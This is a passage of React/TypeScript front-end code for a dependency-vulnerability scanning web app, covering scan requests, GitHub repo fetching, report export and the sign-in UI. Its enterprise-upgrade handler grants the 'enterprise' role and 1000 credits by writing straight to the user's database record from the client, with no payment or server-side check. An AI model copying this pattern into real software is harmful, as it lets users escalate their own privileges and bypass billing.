      loadSavedReports(currentUser.uid);
    }
  };

  const handleUpgradeToEnterprise = async () => {
    if (!currentUser) return;
    try {
      const userRef = doc(db, "users", currentUser.uid);
      const newCredits = userCredits + 1000;
      await setDoc(userRef, { credits: newCredits, role: "enterprise" }, { merge: true });
      setUserCredits(newCredits);
      setIsEnterprise(true);

      await addDoc(collection(db, "auditLogs"), {
        action: "ENTERPRISE_UPGRADE",
        target: "+1000 Credits",
        detail: "Enterprise tier subscription upgraded successfully.",
        actor: currentUser.email || "System Engine",
        timestamp: serverTimestamp()
      });

      const ts = new Date().toLocaleTimeString('en-US', { hour12: true, hour: '2-digit', minute: '2-digit', second: '2-digit' });
      setTelemetry(prev => [...prev, `[${ts}] Enterprise upgrade subscription successfully processed`, `[${ts}] +1000 AI Credits loaded to system`]);

      setShowExhaustionModal(false);
    } catch (e) {
      console.warn("Enterprise upgrade restricted or failed:", e);
    }
  };

  const fetchFirebaseHistory = async (uid: string) => {
    try {
      console.log(`[Firestore Audit] Querying "scans" for userId == "${uid}"`);
      const q = query(collection(db, "scans"), where("userId", "==", uid));
      const querySnapshot = await getDocs(q);
      console.log(`[Firestore Audit] "scans" queried successfully. Snapshot size: ${querySnapshot.size}`);
      const fetchedHistory = querySnapshot.docs.map(doc => doc.data() as ScanResult);
      if (fetchedHistory.length > 0) {
        // Sort on client to avoid Firebase composite index requirement
        const sortedHistory = fetchedHistory.sort((a, b) => new Date(b.timestamp || 0).getTime() - new Date(a.timestamp || 0).getTime()).slice(0, 10);
        setHistory(sortedHistory);
      } else {
        console.warn(`[Firestore Audit] "scans" returned empty snapshot for user "${uid}"`);
      }
    } catch (e) {
      console.error(`[Firestore Audit] Failed to query "scans":`, e);
      console.warn("Failed to fetch history from Firebase (permissions restricted):", e);
      setFirestoreRestricted(true);
    }
  };

  useEffect(() => {
    if (telemetryEndRef.current) telemetryEndRef.current.scrollIntoView({ behavior: 'smooth' });
  }, [telemetry]);

  useEffect(() => {
    if (chatEndRef.current) chatEndRef.current.scrollIntoView({ behavior: 'smooth' });
  }, [chatMessages, isChatting]);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (isScanning) {
      setScanStepIndex(0);
      interval = setInterval(() => {
        setScanStepIndex(prev => Math.min(prev + 1, SCAN_STEPS.length - 1));
      }, 1200);
    }
    return () => clearInterval(interval);
  }, [isScanning]);

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      const selectedFile = e.target.files[0];
      if (selectedFile.name.endsWith('.json')) {
        setFile(selectedFile);
        setError(null);
      } else {
        setError("Please select a valid package.json file.");
        setFile(null);
      }
    }
  };

  const executeScan = async (targetFile: File, githubRepoData?: any) => {
    setIsScanning(true);
    setError(null);
    setScanResult(null);
    setExpandedPackages({});
    if (!githubRepoData) setTelemetry([]);
    setChatMessages([]);

    const formData = new FormData();
    formData.append("file", targetFile);
    if (githubRepoData) {
      formData.append("repoMetadata", JSON.stringify(githubRepoData));
    }

    try {
      const res = await fetch("/api/scan", {
        method: "POST",
        body: formData,
      });

      if (!res.ok) throw new Error("Failed to scan package.json");

      const data = await res.json();
      const resultWithTime = { ...data, timestamp: new Date().toISOString() };

      // Centralized credit deduction & audit logging
      await consumeCredits("scan");

      setScanResult(resultWithTime);
      setTelemetry(prev => [...prev, ...(data.telemetry || [])]);

      // Save to History
      const newHistory = [resultWithTime, ...history].slice(0, 10);
      setHistory(newHistory);

      const targetName = githubRepoData?.name || targetFile.name || "package.json";
      triggerNotification(
        "Security Scan Completed",
        `Scan resolved ${data.vulnerabilities?.length || 0} vulnerabilities across dependencies in ${targetName}.`,
        "scan_completed",
        data.vulnerabilities?.length > 0 ? "warning" : "success"
      );

      if (currentUser) {
        addDoc(collection(db, "scans"), {
          ...resultWithTime,
          userId: currentUser.uid,
        }).catch(e => console.warn("Failed to save to Firebase scans collection (permissions restricted):", e));
      } else {
        localStorage.setItem('cipherkavach_history', JSON.stringify(newHistory));
      }

    } catch (err: unknown) {
      setError(err instanceof Error ? err.message : "An error occurred during scanning.");
      const targetName = githubRepoData?.name || targetFile.name || "package.json";
      triggerNotification(
        "Security Scan Failed",
        `Vulnerability propagation analysis failed for ${targetName}: ${err instanceof Error ? err.message : "Internal engine error."}`,
        "scan_completed",
        "error"
      );
    } finally {
      setIsScanning(false);
    }
  };

  const handleScan = () => {
    if (isDemoQuotaExhausted) {
      setShowGovernanceModal(true);
      return;
    }
    if (isExhausted) {
      setShowExhaustionModal(true);
      return;
    }
    if (githubUrl) {
      handleGithubScan();
    } else if (file) {
      executeScan(file);
    }
  };

  const handleGithubScan = async () => {
    if (!githubUrl) return;
    const match = githubUrl.match(/github\.com\/([^\/]+)\/([^\/]+)/);
    if (!match) {
      setError("Invalid GitHub repository URL. Must be formatted as https://github.com/owner/repo");
      return;
    }
    const [, owner, repo] = match;

    setIsScanning(true);
    setError(null);
    setScanResult(null);
    setTelemetry([`[${new Date().toLocaleTimeString()}] Target acquired: GitHub Repository (${owner}/${repo})`]);

    try {
      setTelemetry(prev => [...prev, `[${new Date().toLocaleTimeString()}] Fetching repository metadata...`]);
      const repoRes = await fetch(`https://api.github.com/repos/${owner}/${repo}`);
      if (!repoRes.ok) throw new Error("Repository not found or access denied (public repos only).");
      const repoData = await repoRes.json();

      const repoMetadata = {
        name: repoData.name,
        owner: repoData.owner.login,
        stars: repoData.stargazers_count,
        language: repoData.language,
        updatedAt: repoData.updated_at
      };

      setTelemetry(prev => [...prev, `[${new Date().toLocaleTimeString()}] Searching for package.json...`]);
      const pkgRes = await fetch(`https://raw.githubusercontent.com/${owner}/${repo}/${repoData.default_branch}/package.json`);
      if (!pkgRes.ok) throw new Error("No package.json found in the root of the repository.");

      const pkgBlob = await pkgRes.blob();
      const pkgFile = new File([pkgBlob], "package.json", { type: "application/json" });

      setTelemetry(prev => [...prev, `[${new Date().toLocaleTimeString()}] package.json extracted successfully.`]);

      await executeScan(pkgFile, repoMetadata);

    } catch (e) {
      setError(e instanceof Error ? e.message : "GitHub analysis failed.");
      setIsScanning(false);
    }
  };

  const runDemoScan = async () => {
    if (isDemoQuotaExhausted) {
      setShowGovernanceModal(true);
      return;
    }
    if (isExhausted) {
      setShowExhaustionModal(true);
      return;
    }
    try {
      const demoData = {
        "name": "vulnerable-demo",
        "dependencies": {
          "lodash": "4.17.15",
          "minimist": "0.0.8",
          "axios": "0.21.0"
        }
      };
      const blob = new Blob([JSON.stringify(demoData)], { type: "application/json" });
      const demoFile = new File([blob], "demo-package.json", { type: "application/json" });
      setFile(demoFile);
      await executeScan(demoFile);
    } catch (e) {
      console.error(e);
      setError("Failed to run demo scan.");
    }
  };

  const loadHistoryResult = (result: ScanResult) => {
    setScanResult(result);
    setTelemetry(result.telemetry || []);
    setShowHistory(false);
    setChatMessages([]);
  };

  const loadSavedReportResult = (report: any) => {
    const result: ScanResult = {
      extracted_count: report.vulnerabilities?.length || 0,
      vulnerabilities: report.vulnerabilities || [],
      overall_ai_summary: report.overall_ai_summary,
      remediation_script: report.remediation_script,
      exploit_simulation: report.exploit_simulation,
      patch_priority: report.patch_priority,
      impact_analysis: report.impact_analysis,
      progression_timeline: report.progression_timeline,
      trust_score: report.trust_score,
      telemetry: report.telemetry || [],
      timestamp: report.createdAt,
      repoMetadata: {
        name: report.repoName,
        owner: report.displayName || "Operator",
        stars: 0,
        language: "",
        updatedAt: report.createdAt
      }
    };
    setScanResult(result);
    setTelemetry(report.telemetry || []);
    setShowHistory(false);
    setChatMessages([]);
  };

  const downloadMarkdown = () => {
    if (!scanResult) return;
    setTelemetry(prev => [...prev, `[${new Date().toLocaleTimeString()}] Markdown report exported successfully.`]);
    const content = `
# CipherKavach AI Security Report
Date: ${new Date().toLocaleString()}

## Executive Summary
${scanResult.overall_ai_summary}

## Remediation Script
\`\`\`bash
${scanResult.remediation_script || "N/A"}
\`\`\`

## Threat Simulation (Proof of Concept)
\`\`\`javascript
${scanResult.exploit_simulation || "N/A"}
\`\`\`

## Vulnerabilities Found (${(scanResult.vulnerabilities || []).length})
${(scanResult.vulnerabilities || []).map(v => `- [${v.severity}] ${v.package} (${v.id})\n  ${v.description}`).join('\n\n')}
    `;
    const blob = new Blob([content.trim()], { type: "text/markdown" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "cipherkavach-report.md";
    a.click();
    setShowExportModal(false);
  };

  const downloadText = () => {
    if (!scanResult) return;
    setTelemetry(prev => [...prev, `[${new Date().toLocaleTimeString()}] Text report exported successfully.`]);
    const content = `
CipherKavach AI Security Report
Date: ${new Date().toLocaleString()}

----------------------------------------
EXECUTIVE SUMMARY
----------------------------------------
${scanResult.overall_ai_summary || "N/A"}

----------------------------------------
REMEDIATION SCRIPT
----------------------------------------
${scanResult.remediation_script || "N/A"}

----------------------------------------
THREAT SIMULATION
----------------------------------------
${scanResult.exploit_simulation || "N/A"}

----------------------------------------
VULNERABILITIES FOUND (${(scanResult.vulnerabilities || []).length})
----------------------------------------
${(scanResult.vulnerabilities || []).map(v => `[${v.severity}] ${v.package} (${v.id})\n${v.description}`).join('\n\n')}
    `;
    const blob = new Blob([content.trim()], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "cipherkavach-report.txt";
    a.click();
    setShowExportModal(false);
  };

  const handleChatSubmit = async (eOrOverride?: React.FormEvent | string) => {
    if (typeof eOrOverride === 'object' && eOrOverride.preventDefault) {
      eOrOverride.preventDefault();
    }
    const inputToUse = typeof eOrOverride === 'string' ? eOrOverride : chatInput;
    if (!inputToUse.trim() || !scanResult) return;

    const userMsg = { role: "user", content: inputToUse };
    setChatMessages(prev => [...prev, userMsg]);
    setChatInput("");
    setIsChatting(true);

    try {
      const res = await fetch("/api/chat", {
        method: "POST",
        body: JSON.stringify({
          messages: [...chatMessages, userMsg],
          contextData: {
            vulnerabilities: scanResult.vulnerabilities,
            overall_ai_summary: scanResult.overall_ai_summary,
            remediation_script: scanResult.remediation_script
          }
        }),
      });
      const data = await res.json();
      if (!res.ok || data.error) {
        setChatMessages(prev => [...prev, { role: "assistant", content: data.message || "AI analysis temporarily unavailable. Please verify runtime configuration." }]);
      } else {
        setChatMessages(prev => [...prev, { role: "assistant", content: data.message }]);
        // Centralized credit deduction for AI query response
        await consumeCredits("ai_action");
      }

      if (data.telemetry && data.telemetry.length > 0) {
        setTelemetry(prev => [...prev, ...data.telemetry]);
      }
    } catch (e) {
      console.error(e);
      setChatMessages(prev => [...prev, { role: "assistant", content: "Terminal Error: Could not connect to CascadeFlow orchestration engine." }]);
    } finally {
      setIsChatting(false);
    }
  };

  const insertSuggestedPrompt = (prompt: string) => {
    setChatInput(prompt);
  };

  const togglePackage = (pkg: string) => {
    setExpandedPackages(prev => ({ ...prev, [pkg]: !prev[pkg] }));
  };

  const formatInlineStyles = (line: string) => {
    const parts = line.split(/(\*\*.*?\*\*|`.*?`)/g);
    return parts.map((part, idx) => {
      if (part.startsWith('**') && part.endsWith('**')) {
        return <strong key={idx} className="text-purple-300 font-bold tracking-wide">{part.slice(2, -2)}</strong>;
      }
      if (part.startsWith('`') && part.endsWith('`')) {
        return <code key={idx} className="bg-black/30 text-purple-200 px-1.5 py-0.5 rounded font-mono text-xs border border-purple-500/20">{part.slice(1, -1)}</code>;
      }
      return part;
    });
  };

  const renderFormattedText = (text: string) => {
    if (!text) return null;
    return text.split('\n').map((line, i) => {
      if (line.startsWith('```')) return null; // Skip code block markers if any

      // Handle bullets
      if (line.trim().startsWith('- ') || line.trim().startsWith('* ')) {
        return (
          <div key={i} className="flex items-start gap-2 mt-2 mb-1">
            <span className="text-purple-400 mt-1 shrink-0">•</span>
            <span className="flex-1 leading-relaxed text-gray-300 font-medium">
              {formatInlineStyles(line.replace(/^[-*]\s/, ''))}
            </span>
          </div>
        );
      }

      // Empty lines
      if (!line.trim()) return <div key={i} className="h-2"></div>;

      // Normal paragraphs
      return (
        <p key={i} className="mb-2 leading-relaxed text-gray-300">
          {formatInlineStyles(line)}
        </p>
      );
    });
  };

  // Compute Stats
  const stats = useMemo(() => {
    if (!scanResult) return null;
    const vulns = scanResult.vulnerabilities;

    let critical = 0;
    let high = 0;
    let medium = 0;
    let low = 0;

    const packageGroups: Record<string, Vuln[]> = {};

    vulns.forEach(v => {
      const sev = v.severity.toUpperCase();
      if (sev === "CRITICAL") critical++;
      else if (sev === "HIGH") high++;
      else if (sev === "MODERATE" || sev === "MEDIUM") medium++;
      else low++;

      if (!packageGroups[v.package]) packageGroups[v.package] = [];
      packageGroups[v.package].push(v);
    });

    const totalScore = (critical * 4) + (high * 3) + (medium * 2) + (low * 1);
    let riskLevel = "SECURE";
    let riskColor = "text-green-400 bg-green-500/20 border-green-500/30";

    if (totalScore >= 10 || critical > 0) {
      riskLevel = "CRITICAL RISK";
      riskColor = "text-red-400 bg-red-500/20 border-red-500/30 shadow-[0_0_15px_rgba(239,68,68,0.3)]";
    } else if (totalScore >= 5 || high > 0) {
      riskLevel = "HIGH RISK";
      riskColor = "text-orange-400 bg-orange-500/20 border-orange-500/30 shadow-[0_0_15px_rgba(249,115,22,0.3)]";
    } else if (totalScore > 0) {
      riskLevel = "MODERATE RISK";
      riskColor = "text-yellow-400 bg-yellow-500/20 border-yellow-500/30 shadow-[0_0_15px_rgba(234,179,8,0.3)]";
    }

    const chartData = [
      { name: "Critical", count: critical, color: "#ef4444" },
      { name: "High", count: high, color: "#f97316" },
      { name: "Medium", count: medium, color: "#eab308" },
      { name: "Low", count: low, color: "#3b82f6" },
    ].filter(d => d.count > 0);

    return { total: vulns.length, critical, high, medium, low, riskLevel, riskColor, packageGroups, chartData };
  }, [scanResult]);

  return (
    <div className="relative min-h-screen bg-[#030712] text-white selection:bg-blue-500/30 overflow-x-hidden" suppressHydrationWarning>
      <div className="fixed top-0 left-1/2 -translate-x-1/2 w-[1000px] h-[500px] bg-blue-600/10 rounded-full blur-[150px] pointer-events-none opacity-60 mix-blend-screen" />

      <nav className="relative z-50 border-b border-white/5 bg-black/40 backdrop-blur-xl sticky top-0">
        <div className="max-w-[1600px] mx-auto px-6 lg:px-12 py-4 flex items-center justify-between">
          <Link href="/" className="flex items-center gap-3 transition-opacity hover:opacity-80">
            <div className="relative flex items-center justify-center px-4 py-1.5 rounded-full bg-blue-500/5 border border-blue-500/30 shadow-[0_0_15px_rgba(59,130,246,0.15)] overflow-hidden">
              <Shield className="w-5 h-5 text-blue-400" />
              <div className="absolute inset-0 bg-blue-500/10 rounded-full opacity-0 hover:opacity-100 transition-opacity duration-300 blur-sm" />
            </div>
            <span className="font-bold tracking-tight text-lg glow-text text-white">CipherKavach AI</span>
          </Link>
          <div className="flex items-center gap-4">
            <Link href="/enterprise" className="text-xs font-bold uppercase tracking-widest text-purple-400 hover:text-purple-300 transition-colors hidden sm:inline-flex items-center gap-1.5 border border-purple-500/30 bg-purple-500/10 px-3 py-1 rounded-full">
              <Zap className="w-3.5 h-3.5" /> Enterprise
            </Link>
            {(history.length > 0 || savedReports.length > 0) && (
              <button onClick={() => setShowHistory(true)} className="flex items-center gap-2 text-sm text-gray-400 hover:text-white transition-colors">
                <History className="w-4 h-4" />
                <span className="hidden sm:inline">History</span>
              </button>
            )}
            <button suppressHydrationWarning onClick={runDemoScan} className="hidden sm:flex items-center gap-2 text-sm font-medium text-blue-400 hover:text-blue-300 transition-colors border border-blue-500/30 bg-blue-500/10 px-4 py-1.5 rounded-full shadow-[0_0_10px_rgba(59,130,246,0.1)]">
              <PlayCircle className="w-4 h-4" />
              Run Demo
            </button>
            <div className="flex items-center gap-2 text-sm text-gray-400 bg-white/5 px-3 py-1.5 rounded-full border border-white/10 hidden lg:flex">
              <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse shadow-[0_0_5px_rgba(34,197,94,0.6)]"></span>
              <span className="font-mono">CascadeFlow</span>
            </div>

            {/* Bell Icon & Notification Center */}
            {currentUser && (
              <div className="relative">
                <button
                  onClick={() => setShowNotificationsPanel(!showNotificationsPanel)}
                  className="relative p-2 text-gray-400 hover:text-white transition-colors rounded-full hover:bg-white/5 border border-white/5 hover:border-white/10 flex items-center justify-center"
                  title="Runtime Notifications"
                >
                  <Bell className="w-4 h-4" />
                  {notifications.filter(n => !n.read).length > 0 && (
                    <span className="absolute top-1.5 right-1.5 w-1.5 h-1.5 rounded-full bg-cyan-400 animate-pulse shadow-[0_0_8px_rgba(34,211,238,0.8)]" />
                  )}
                </button>

                {/* FLOATING NOTIFICATION CENTER PANEL */}
                <AnimatePresence>
                  {showNotificationsPanel && (
                    <>
                      {/* Click-out backdrop */}
                      <div className="fixed inset-0 z-40" onClick={() => setShowNotificationsPanel(false)} />

                      <motion.div
                        initial={{ opacity: 0, y: 10, scale: 0.95 }}
                        animate={{ opacity: 1, y: 0, scale: 1 }}
                        exit={{ opacity: 0, y: 10, scale: 0.95 }}
                        className="absolute right-0 mt-3 w-80 sm:w-96 max-h-[480px] bg-[#0c101b]/95 border border-white/10 rounded-2xl shadow-[0_10px_50px_rgba(0,0,0,0.8)] backdrop-blur-xl z-50 overflow-hidden flex flex-col"
                      >
                        <div className="absolute top-0 left-0 w-full h-[2px] bg-gradient-to-r from-cyan-500 via-blue-500 to-purple-500" />

                        {/* Header */}
                        <div className="p-4 border-b border-white/5 flex items-center justify-between shrink-0">
                          <div className="flex items-center gap-2">
                            <Bell className="w-4 h-4 text-cyan-400" />
                            <h3 className="font-bold text-sm tracking-tight text-white uppercase font-mono">Runtime Operations</h3>
                          </div>
                          {notifications.filter(n => !n.read).length > 0 && (
                            <span className="text-[10px] bg-cyan-400/10 text-cyan-400 border border-cyan-400/30 px-2 py-0.5 rounded-full font-mono font-bold">
                              {notifications.filter(n => !n.read).length} UNREAD
                            </span>
                          )}
                        </div>

                        {/* Notification list */}
                        <div className="flex-1 overflow-y-auto divide-y divide-white/5 max-h-[340px] custom-scrollbar">
                          {notifications.length === 0 ? (
                            <div className="p-8 text-center text-gray-500 font-mono text-xs">
                              No telemetry notifications recorded.
                            </div>
                          ) : (
                            notifications.map((n) => {
                              let severityColor = "bg-blue-400";
                              let cardBorderClass = "border-transparent";

                              if (n.severity === "warning") {
                                severityColor = "bg-yellow-400";
                              } else if (n.severity === "error") {
                                severityColor = "bg-red-400";
                              } else if (n.severity === "success") {
                                severityColor = "bg-green-400";
                              }

                              return (
                                <div
                                  key={n.id}
                                  className={`p-4 transition-colors relative flex items-start gap-3 hover:bg-white/[0.02] ${!n.read ? "bg-white/[0.01]" : "opacity-60"
                                    }`}
                                >
                                  {/* Unread indicator line */}
                                  {!n.read && (
                                    <div className="absolute top-0 left-0 bottom-0 w-[3px] bg-cyan-400" />
                                  )}

                                  {/* Category/Severity bullet */}
                                  <div className="mt-1 shrink-0">
                                    <span className={`w-2 h-2 rounded-full block ${severityColor} animate-pulse`} />
                                  </div>

                                  <div className="flex-1 min-w-0 space-y-1">
                                    <div className="flex items-center justify-between gap-2">
                                      <p className={`font-mono text-xs font-bold truncate ${!n.read ? "text-white" : "text-gray-400"}`}>
                                        {n.title}
                                      </p>
                                      <span className="text-[9px] text-gray-500 font-mono shrink-0">
                                        {new Date(n.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                                      </span>
                                    </div>
                                    <p className="text-xs text-gray-400 leading-normal font-sans">
                                      {n.message}
                                    </p>
                                    <div className="flex items-center justify-between pt-1">
                                      <span className="text-[9px] text-cyan-400/80 font-mono uppercase bg-cyan-400/5 px-1.5 py-0.5 rounded border border-cyan-400/10">
                                        {n.category.replace("_", " ")}
                                      </span>
                                      <div className="flex gap-2">
                                        {!n.read && (
                                          <button
                                            onClick={() => markNotificationRead(n.id)}
                                            className="text-[9px] text-gray-400 hover:text-white font-mono uppercase transition-colors"
                                          >
                                            Mark Read
                                          </button>
                                        )}
                                        <button
                                          onClick={() => clearNotification(n.id)}
                                          className="text-[9px] text-gray-500 hover:text-red-400 font-mono uppercase transition-colors"
                                        >
                                          Clear
                                        </button>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              );
                            })
                          )}
                        </div>

                        {/* Footer Actions */}
                        {notifications.length > 0 && (
                          <div className="p-3 border-t border-white/5 bg-black/40 flex items-center justify-between shrink-0">
                            <button
                              onClick={clearAllNotifications}
                              className="text-[10px] text-gray-500 hover:text-red-400 font-mono uppercase tracking-wider transition-colors font-bold"
                            >
                              Clear All Logs
                            </button>
                            <button
                              onClick={() => {
                                // Mark all as read helper
                                notifications.forEach(n => { if (!n.read) markNotificationRead(n.id); });
                              }}
                              className="text-[10px] text-gray-400 hover:text-white font-mono uppercase tracking-wider transition-colors font-bold"
                            >
                              Mark All As Read
                            </button>
                          </div>
                        )}
                      </motion.div>
                    </>
                  )}
                </AnimatePresence>
              </div>
            )}

            <div className="h-6 w-px bg-white/10 mx-1"></div>

            {isAuthLoading || isProfileLoading ? (
              <div className="w-8 h-8 rounded-full bg-white/5 animate-pulse"></div>
            ) : currentUser ? (
              <button onClick={() => setShowControlCenter(true)} className="flex items-center gap-2 bg-white/5 border border-white/10 p-1 pr-3 rounded-full hover:bg-white/10 transition-colors">
                <img src={computedAvatarUrl} alt="Avatar" className="w-7 h-7 rounded-full object-cover" />
                <span className="text-sm font-medium text-gray-300 hidden sm:inline">{userDoc?.displayName || currentUser.displayName || "Agent"}</span>
              </button>
            ) : (
              <button onClick={() => setShowAuthModal(true)} className="flex items-center gap-2 text-sm font-medium text-white hover:text-blue-300 transition-colors border border-white/10 bg-white/5 px-4 py-1.5 rounded-full hover:bg-white/10">
                <User className="w-4 h-4" />
                <span className="hidden sm:inline">Operator Login</span>
              </button>
            )}
          </div>
        </div>
      </nav>

      {/* Auth Modal */}
      <AnimatePresence>
        {showAuthModal && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="fixed inset-0 z-[70] bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
            <motion.div initial={{ scale: 0.95, y: 10 }} animate={{ scale: 1, y: 0 }} exit={{ scale: 0.95, y: 10 }} className="bg-[#0f1219] border border-white/10 rounded-2xl max-w-sm w-full shadow-2xl relative overflow-hidden">
              <div className="absolute top-0 left-0 w-full h-[2px] bg-gradient-to-r from-blue-500 via-purple-500 to-cyan-400" />
              <button onClick={() => { setShowAuthModal(false); setAuthError(""); }} className="absolute top-4 right-4 text-gray-400 hover:text-white transition-colors"><X className="w-5 h-5" /></button>

              <div className="p-8 flex flex-col items-center text-center">
                <div className="w-14 h-14 rounded-2xl bg-blue-500/10 flex items-center justify-center mb-5 border border-blue-500/20 shadow-[0_0_20px_rgba(59,130,246,0.15)]">
                  <Shield className="w-7 h-7 text-blue-400" />
                </div>
                <h3 className="text-xl font-bold text-white tracking-tight mb-1">CipherKavach AI</h3>
                <p className="text-gray-500 text-xs mb-6">Authenticate to access the intelligence platform.</p>

                {/* OAuth Buttons */}
                <div className="w-full space-y-2.5 mb-5">
                  <button onClick={() => { setIsSigningIn(true); signInWithPopup(auth, googleProvider).then(() => setShowAuthModal(false)).finally(() => setIsSigningIn(false)); }} disabled={isSigningIn} className="w-full py-2.5 px-4 bg-white text-black font-semibold rounded-xl flex items-center justify-center gap-3 hover:bg-gray-100 transition-colors text-sm disabled:opacity-60">
                    <svg className="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" /><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" /><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" /><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" /></svg>
                    Continue with Google
                  </button>
                  <button onClick={() => { setIsSigningIn(true); signInWithPopup(auth, githubProvider).then(() => setShowAuthModal(false)).finally(() => setIsSigningIn(false)); }} disabled={isSigningIn} className="w-full py-2.5 px-4 bg-[#24292e] text-white font-semibold rounded-xl flex items-center justify-center gap-3 hover:bg-[#2c3238] transition-colors border border-white/5 text-sm disabled:opacity-60">
                    <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" /></svg>
                    Continue with GitHub
                  </button>
                </div>                {/* Divider */}
                <div className="w-full flex items-center gap-3 mb-4">
                  <div className="flex-1 h-px bg-white/10" />
                  <span className="text-[10px] text-gray-600 uppercase font-bold tracking-widest">or</span>
                  <div className="flex-1 h-px bg-white/10" />
                </div>

                {/* Form Tabs */}
                <div className="flex border border-white/5 bg-white/[0.02] p-1 rounded-xl w-full mb-4 font-mono text-xs">
                  <button
                    type="button"
                    onClick={() => { setAuthMode("login"); setAuthError(""); }}
                    className={`flex-1 py-1.5 rounded-lg font-bold uppercase transition-all ${authMode === "login"
                      ? "bg-blue-500/20 text-blue-400 border border-blue-500/30"
                      : "text-gray-500 hover:text-gray-300"
                      }`}
                  >
                    Sign In
                  </button>
                  <button
                    type="button"
                    onClick={() => { setAuthMode("signup"); setAuthError(""); }}
                    className={`flex-1 py-1.5 rounded-lg font-bold uppercase transition-all ${authMode === "signup"
                      ? "bg-blue-500/20 text-blue-400 border border-blue-500/30"
                      : "text-gray-500 hover:text-gray-300"
                      }`}
                  >
                    Register
                  </button>
                </div>

                {/* Email / Password Form */}
                <form onSubmit={handleEmailAuth} className="w-full space-y-2.5">
                  {authMode === "signup" && (
                    <input
                      type="text" placeholder="Full Name" value={authFullName}
                      onChange={e => { setAuthFullName(e.target.value); setAuthError(""); }}
                      className="w-full px-4 py-2.5 bg-white/5 border border-white/10 rounded-xl text-sm text-white placeholder:text-gray-600 outline-none focus:border-blue-500/60 focus:shadow-[0_0_0_2px_rgba(59,130,246,0.15)] transition-all"
                      required
                    />
                  )}
                  <input
                    type="email" placeholder="Email address" value={authEmail}
                    onChange={e => { setAuthEmail(e.target.value); setAuthError(""); }}
                    className="w-full px-4 py-2.5 bg-white/5 border border-white/10 rounded-xl text-sm text-white placeholder:text-gray-600 outline-none focus:border-blue-500/60 focus:shadow-[0_0_0_2px_rgba(59,130,246,0.15)] transition-all"
                    required
                  />
                  <input
                    type="password" placeholder="Password" value={authPassword}
                    onChange={e => { setAuthPassword(e.target.value); setAuthError(""); }}
                    className="w-full px-4 py-2.5 bg-white/5 border border-white/10 rounded-xl text-sm text-white placeholder:text-gray-600 outline-none focus:border-blue-500/60 focus:shadow-[0_0_0_2px_rgba(59,130,246,0.15)] transition-all"
                    required
                  />
                  {authError && (
                    <div className="text-left bg-red-500/10 border border-red-500/30 p-3 rounded-xl mb-4 w-full">
                      <p className="text-xs text-red-400 font-mono leading-relaxed">{authError}</p>
                      {authError.includes("Account not found") && (
                        <button
                          type="button"
                          onClick={() => { setAuthMode("signup"); setAuthError(""); }}
                          className="mt-2 text-[10px] text-blue-400 hover:text-blue-300 font-bold uppercase tracking-wider underline block text-left"
                        >
                          👉 Create a new account now
                        </button>
                      )}
                    </div>
                  )}
                  <button type="submit" disabled={isSigningIn} className="w-full py-2.5 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-xl transition-colors text-sm disabled:opacity-60 flex items-center justify-center gap-2">
                    {isSigningIn ? <Loader2 className="w-4 h-4 animate-spin" /> : <Shield className="w-4 h-4" />}
                    {isSigningIn ? "Authenticating..." : authMode === "login" ? "Authorize Operator" : "Register Operator"}
                  </button>
                </form>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Edit Profile Modal */}
      <AnimatePresence>
        {showEditProfileModal && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="fixed inset-0 z-[80] bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
            <motion.div initial={{ scale: 0.95, y: 10 }} animate={{ scale: 1, y: 0 }} exit={{ scale: 0.95, y: 10 }} className="bg-[#0f1219] border border-blue-500/20 rounded-2xl max-w-sm w-full shadow-2xl relative overflow-hidden">
              <div className="absolute top-0 left-0 w-full h-[2px] bg-gradient-to-r from-blue-500 via-purple-500 to-cyan-400" />
              <button onClick={() => setShowEditProfileModal(false)} className="absolute top-4 right-4 text-gray-400 hover:text-white transition-colors"><X className="w-5 h-5" /></button>

